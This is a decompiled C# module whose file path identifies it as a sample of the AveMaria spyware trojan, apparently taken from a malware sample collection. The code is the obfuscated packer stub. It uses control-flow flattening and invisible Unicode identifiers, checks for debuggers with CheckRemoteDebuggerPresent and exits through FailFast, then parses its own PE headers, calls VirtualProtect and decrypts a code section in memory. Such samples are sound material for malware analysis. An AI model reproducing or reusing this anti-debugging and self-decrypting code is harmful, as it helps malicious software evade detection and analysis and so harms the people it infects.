// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: TypeAnaly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E27F761B-4959-4BED-A574-0FA81E938C3A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.AveMaria.gen-d094c5a8bfae919c84a9b93e7cc14955ea7d8b95faca2aaf8c19788fbe25fb24.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

internal class \u003CModule\u003E
{
  static \u003CModule\u003E() => \u003CModule\u003E.\u206C⁯‪‭‎⁯⁫‍‪‎⁫‌​‌‭⁮‬‎‬‍‏‌⁯‭‫​‪⁭‍⁪‏‫‫‬⁬‪‬‎​‫‮();

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool \u202C‎⁯⁬‭⁮⁫⁭‍‬⁫⁭⁪⁬​⁫⁮‪‬‪‏‍‎‭⁮‭⁮⁯‬‏‌​‬‫⁭⁬‫‫‌⁪‮(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
  internal static extern bool \u200D‪‮‫⁭⁯‌⁪​‮‎‫​⁬⁬‫⁮‬⁮⁭‬‬‮‏‎⁯​⁪‮‌‌⁯‫‪‫‍⁭‍⁬‭‮(
    [In] IntPtr obj0,
    [In] ref bool obj1);

  internal static unsafe void \u206C⁯‪‭‎⁯⁫‍‪‎⁫‌​‌‭⁮‬‎‬‍‏‌⁯‭‫​‪⁭‍⁪‏‫‫‬⁬‪‬‎​‫‮()
  {
    Module module = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module.FullyQualifiedName;
    bool flag1 = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
label_1:
    int num1 = -410249860;
    while (true)
    {
      uint num2;
      uint num3;
      uint num4;
      uint[] numArray1;
      uint[] numArray2;
      uint num5;
      uint* numPtr1;
      uint num6;
      bool flag2;
      int num7;
      ushort num8;
      uint* numPtr2;
      uint num9;
      int index;
      uint num10;
      uint num11;
      uint num12;
      uint* numPtr3;
      uint num13;
      uint num14;
      uint num15;
      int num16;
      switch ((num2 = (uint) (num1 ^ -330047304)) % 59U)
      {
        case 0:
          num5 = 64U;
          num1 = (int) num2 * 1125199095 ^ -357637281;
          continue;
        case 1:
          ++num7;
          num1 = (int) num2 * 1690782428 ^ 1207120325;
          continue;
        case 2:
          int num17 = num5 != 64U ? -1916969844 : (num17 = -738804259);
          num1 = num17 ^ (int) num2 * -108517563;
          continue;
        case 3:
          num7 = 0;
          num1 = -1231735717;
          continue;
        case 4:
          num15 = num14 >> 7 | num14 << 25;
          num1 = -1510996233;
          continue;
        case 5:
          Environment.FailFast((string) null);
          num1 = (int) num2 * -304722999 ^ -1428690013;
          continue;
        case 6:
          numArray1[0] = numArray1[0] ^ numArray2[0];
          num1 = (int) num2 * 1449359519 ^ 287518179;
          continue;
        case 7:
          if (flag1)
          {
            num16 = (int) numPtr1[2];
            break;
          }
          num1 = -1009772929;
          continue;
        case 8:
          \u003CModule\u003E.\u200D‪‮‫⁭⁯‌⁪​‮‎‫​⁬⁬‫⁮‬⁮⁭‬‬‮‏‎⁯​⁪‮‌‌⁯‫‪‫‍⁭‍⁬‭‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = (int) num2 * -368838562 ^ -226949428;
          continue;
        case 9:
          num3 = num15 >> 3 | num15 << 29;
          num1 = (int) num2 * 1612061474 ^ -656516282;
          continue;
        case 10:
          numArray1[1] = numArray1[1] * numArray2[1];
          num1 = (int) num2 * 361132462 ^ 1362750956;
          continue;
        case 11:
          numArray1[6] = numArray1[6] ^ numArray2[6];
          num1 = (int) num2 * 1482031587 ^ -615658373;
          continue;
        case 12:
          \u003CModule\u003E.\u202C‎⁯⁬‭⁮⁫⁭‍‬⁫⁭⁪⁬​⁫⁮‪‬‪‏‍‎‭⁮‭⁮⁯‬‏‌​‬‫⁭⁬‫‫‌⁪‮((IntPtr) (void*) numPtr3, num6 << 2, num5, ref num5);
          num1 = (int) num2 * -339320182 ^ -646899680;
          continue;
        case 13:
          num1 = (int) num2 * -855838227 ^ 1761624869;
          continue;
        case 14:
          uint* numPtr4 = numPtr1;
          uint* numPtr5 = (uint*) ((IntPtr) numPtr4 + 4);
          int num18 = (int) *numPtr4;
          uint* numPtr6 = numPtr5;
          numPtr1 = (uint*) ((IntPtr) numPtr6 + 4);
          int num19 = (int) *numPtr6;
          num13 = (uint) (num18 * num19);
          int num20;
          num1 = num20 = num13 != 2945370979U ? -611022711 : (num20 = -1093378593);
          continue;
        case 15:
          int num21 = ((int) num4 ^ (int) *numPtr2++) + (int) num3 + (int) num15 * (int) num14;
          num4 = num3;
          num3 = num14;
          num14 = (uint) num21;
          num1 = -565535899;
          continue;
        case 16:
          num10 = 0U;
          num1 = -358017977;
          continue;
        case 17:
          int num22 = !flag2 ? -40853138 : (num22 = -2001201571);
          num1 = num22 ^ (int) num2 * 1890769737;
          continue;
        case 18:
          Environment.FailFast((string) null);
          num1 = (int) num2 * 1827531645 ^ -598784950;
          continue;
        case 19:
          uint* numPtr7 = numPtr3;
          int num23 = (int) *numPtr7 ^ (int) numArray1[(int) num10 & 15];
          *numPtr7 = (uint) num23;
          numArray1[(int) num10 & 15] = (uint) (((int) numArray1[(int) num10 & 15] ^ (int) *numPtr3++) + 1035675673);
          num1 = -1233679340;
          continue;
        case 20:
          int num24;
          num1 = num24 = num9 >= num6 ? -608424501 : (num24 = -925625818);
          continue;
        case 21:
          int num25 = flag2 ? 487531166 : (num25 = 2101410932);
          num1 = num25 ^ (int) num2 * -1341650797;
          continue;
        case 22:
          int num26;
          num1 = num26 = index < 16 ? -2130356188 : (num26 = -1144050090);
          continue;
        case 23:
          numArray1[7] = numArray1[7] * numArray2[7];
          numArray1[8] = numArray1[8] + numArray2[8];
          num1 = (int) num2 * -1143390245 ^ 326383204;
          continue;
        case 24:
          goto label_33;
        case 25:
          num15 = 1074423959U;
          num14 = 4278920173U;
          num1 = (int) num2 * -1906731408 ^ 1776281359;
          continue;
        case 26:
          \u003CModule\u003E.\u200D‪‮‫⁭⁯‌⁪​‮‎‫​⁬⁬‫⁮‬⁮⁭‬‬‮‏‎⁯​⁪‮‌‌⁯‫‪‫‍⁭‍⁬‭‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = (int) num2 * -648368941 ^ 939189920;
          continue;
        case 27:
          Environment.FailFast((string) null);
          num1 = (int) num2 * -545950469 ^ -967348262;
          continue;
        case 28:
          num1 = (int) num2 * -2128535258 ^ 482159011;
          continue;
        case 29:
          Environment.FailFast((string) null);
          num1 = (int) num2 * -817995597 ^ -22495909;
          continue;
        case 30:
          num9 = 0U;
          num1 = (int) num2 * -1662819347 ^ -1477464885;
          continue;
        case 31:
          goto label_1;
        case 32:
          numArray1[15] = numArray1[15] ^ numArray2[15];
          num1 = (int) num2 * 1828264099 ^ -500693764;
          continue;
        case 33:
          int num27;
          num1 = num27 = num7 >= (int) num8 ? -703857552 : (num27 = -2124984575);
          continue;
        case 34:
          int num28 = !flag2 ? -1789062545 : (num28 = -1065458103);
          num1 = num28 ^ (int) num2 * 1472122023;
          continue;
        case 35:
          ++num11;
          num1 = (int) num2 * 491858363 ^ 1277080189;
          continue;
        case 36:
          goto label_3;
        case 37:
          num3 = 1588607143U;
          num1 = (int) num2 * 921228498 ^ -1515910106;
          continue;
        case 38:
          numArray1[9] = numArray1[9] ^ numArray2[9];
          numArray1[10] = numArray1[10] * numArray2[10];
          numArray1[11] = numArray1[11] + numArray2[11];
          numArray1[12] = numArray1[12] ^ numArray2[12];
          numArray1[13] = numArray1[13] * numArray2[13];
          numArray1[14] = numArray1[14] + numArray2[14];
          num1 = (int) num2 * -426148205 ^ 2104946480;
          continue;
        case 39:
          numArray1[2] = numArray1[2] + numArray2[2];
          num1 = (int) num2 * 72117607 ^ 722091053;
          continue;
        case 40:
          ++num9;
          num1 = (int) num2 * -1669885046 ^ -765741887;
          continue;
        case 41:
          num14 = num4 >> 11 | num4 << 21;
          ++index;
          num1 = (int) num2 * -691570278 ^ 1580650993;
          continue;
        case 42:
          numPtr3 = (uint*) (hinstance + (flag1 ? numPtr1[3] : numPtr1[1]));
          num1 = -54038285;
          continue;
        case 43:
          numArray1[index] = num14;
          numArray2[index] = num3;
          num1 = -1667120441;
          continue;
        case 44:
          num12 = numPtr1[2] >> 2;
          num11 = 0U;
          num1 = (int) num2 * -1878374746 ^ 1142335416;
          continue;
        case 45:
          byte* numPtr8 = hinstance + *(uint*) (hinstance + 60);
          num8 = *(ushort*) (numPtr8 + 6);
          ushort num29 = *(ushort*) (numPtr8 + 20);
          flag2 = false;
          numPtr3 = (uint*) null;
          num6 = 0U;
          numPtr1 = (uint*) (numPtr8 + 24 + (int) num29);
          num4 = 3674657125U;
          num1 = (int) num2 * 216236660 ^ -118744279;
          continue;
        case 46:
          num16 = (int) *numPtr1;
          break;
        case 47:
          num4 = num3 >> 5 | num3 << 27;
          num1 = (int) num2 * -327942797 ^ 945939024;
          continue;
        case 48:
          numArray1[3] = numArray1[3] ^ numArray2[3];
          numArray1[4] = numArray1[4] * numArray2[4];
          num1 = (int) num2 * -1138450477 ^ 960122931;
          continue;
        case 49:
          int num30 = flag2 ? 892817266 : (num30 = 2061238757);
          num1 = num30 ^ (int) num2 * 434765457;
          continue;
        case 50:
          ++num10;
          num1 = -15958110;
          continue;
        case 51:
          int num31;
          num1 = num31 = num13 == 0U ? -235332237 : (num31 = -305795972);
          continue;
        case 52:
          int num32;
          num1 = num32 = num11 >= num12 ? -235332237 : (num32 = -753818014);
          continue;
        case 53:
          numArray1 = new uint[16];
          numArray2 = new uint[16];
          index = 0;
          num1 = (int) num2 * 21046588 ^ -193096297;
          continue;
        case 54:
          numArray1[5] = numArray1[5] + numArray2[5];
          num1 = (int) num2 * 1929465108 ^ 123326495;
          continue;
        case 55:
          numPtr2 = (uint*) (hinstance + (flag1 ? numPtr1[3] : numPtr1[1]));
          num1 = -1489221873;
          continue;
        case 56:
          numPtr1 += 8;
          num1 = -717250613;
          continue;
        case 57:
          \u003CModule\u003E.\u200D‪‮‫⁭⁯‌⁪​‮‎‫​⁬⁬‫⁮‬⁮⁭‬‬‮‏‎⁯​⁪‮‌‌⁯‫‪‫‍⁭‍⁬‭‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = (int) num2 * 1768642761 ^ -2019259883;
          continue;
        case 58:
          \u003CModule\u003E.\u200D‪‮‫⁭⁯‌⁪​‮‎‫​⁬⁬‫⁮‬⁮⁭‬‬‮‏‎⁯​⁪‮‌‌⁯‫‪‫‍⁭‍⁬‭‮(Process.GetCurrentProcess().Handle, ref flag2);
          num1 = (int) num2 * -643276954 ^ 900294416;
          continue;
        default:
          goto label_64;
      }
      num6 = (uint) num16 >> 2;
      num1 = -235332237;
    }
label_33:
    return;
label_3:
    return;
label_64:;
  }
}
